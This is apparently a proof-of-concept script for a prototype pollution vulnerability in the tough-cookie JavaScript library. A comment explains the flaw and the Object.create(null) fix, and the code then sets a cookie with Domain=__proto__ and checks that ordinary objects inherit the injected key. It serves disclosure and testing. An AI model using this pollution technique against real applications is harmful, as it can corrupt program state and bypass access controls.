
/* 
   The vulnerable code:
    this.idx[cookie.domain][cookie.path][cookie.key] = cookie;
   Which is equivelant to:
    this.__proto__["/pollutedPath"]["pollutedKey"] = cookie;
   
   This vulnerability allows injecting global objects to every object that has a prototype.
   This type of vulnerability can allow a malicious attacker to gain access to services he shouldn't have access to.

   To fix the issue we need to ensure the idx object does not have a prototype by exchanging:
    this.idx = {};
    this.idx[cookie.domain] = {};
    this.idx[cookie.domain][cookie.path] = {};
   With:
    this.idx = Object.create(null);
    this.idx[cookie.domain] = Object.create(null);
    this.idx[cookie.domain][cookie.path] = Object.create(null);

*/
  
async function dummyCallback(err, cookie) {
    //
    return 0;
}
async function main() {
    var tough = require("tough-cookie");
    var cookieJar = new tough.CookieJar(undefined, {rejectPublicSuffixes: false});
    await cookieJar.setCookie(
        "pollutedKey=key; Domain=__proto__; Path=/pollutedPath",
        "https://__proto__/",
        [looseMode = true], 
        dummyCallback
    );

    isExploitable = {}
    
    try{
        if(isExploitable["/pollutedPath"]["pollutedKey"]) { // polluted prototype
            console.log("EXPLOITED SUCCESSFULLY");
        }
    }
    catch {
        console.log("EXPLOIT FAILED");
    }
}

main();